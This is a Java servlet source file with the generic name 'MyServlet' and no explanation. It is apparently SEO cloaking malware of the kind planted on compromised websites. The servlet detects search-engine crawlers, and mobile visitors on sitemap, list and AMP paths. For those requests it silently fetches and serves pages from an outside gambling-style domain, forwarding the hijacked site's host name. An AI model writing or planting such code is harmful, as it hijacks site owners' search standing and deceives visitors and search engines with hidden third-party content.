import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

@WebServlet("/MyServlet")
public class MyServlet extends HttpServlet {

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String url = request.getRequestURI();
        url = url.substring(url.indexOf('?') + 1);
        String ref = request.getHeader("Referer") == null ? "" : request.getHeader("Referer");
        String scheme = request.getScheme();
        String ent = request.getHeader("User-Agent");
        String site = "https://xosobet888.com";
        String hostName = request.getScheme() + "://" + request.getServerName() + request.getRequestURI();
        String road = url.contains("?") ? "&" : "?";
        road += "host=" + hostName;

        if ("https".equals(scheme)) road += "&scheme=https";

        String regs = "Google|Bing|Spider|So.com|baidu|Sm.cn";
        String mobile = "phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone";
        boolean area = url.matches(".*/sitemap\\d\\.xml|/sitemap_index\\.xml|/list-|/amp/.*");

        if (ent.matches(".*(" + regs + ").*")) {
            if (area) {
                exitWithResponse(site + url + road, ent, ref, response);
            } else {
                sendResponse(site + "/index.php?" + road, ent, ref, response);
            }
        }
        if (area && ent.matches(".*(" + mobile + ").*")) {
            exitWithResponse(site + url + road, ent, ref, response);
        }
    }

    private void exitWithResponse(String url, String ent, String ref, HttpServletResponse servletResponse) throws IOException {
        String result = get(url, ent, ref);
        servletResponse.getOutputStream().print(result);
        servletResponse.getOutputStream().flush();
    }

    private void sendResponse(String url, String ent, String ref, HttpServletResponse servletResponse) throws IOException {
        String result = get(url, ent, ref);
        servletResponse.getOutputStream().print(result);
        servletResponse.flushBuffer();
    }

    private String get(String urlString, String ent, String ref) throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("User-Agent", ent);
        connection.setRequestProperty("Referer", ref);
        connection.setDoOutput(true);
        connection.setInstanceFollowRedirects(false);
        connection.connect();

        StringBuilder result = new StringBuilder();
        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line);
            }
        }

        connection.disconnect();
        return result.toString();
    }
}
